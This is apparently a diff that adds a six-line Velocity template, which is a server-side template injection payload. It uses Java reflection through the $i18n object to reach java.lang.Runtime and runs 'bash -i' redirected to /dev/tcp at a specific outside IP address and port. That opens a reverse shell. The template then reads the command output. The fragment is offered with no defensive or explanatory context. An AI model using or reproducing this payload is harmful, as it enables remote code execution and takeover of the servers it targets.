@@ -1,0 +1,6 @@
+#set($ex=$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('bash -i >& /dev/tcp/39.105.128.57/90 0>&1'))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])
+$out.read()
+#end
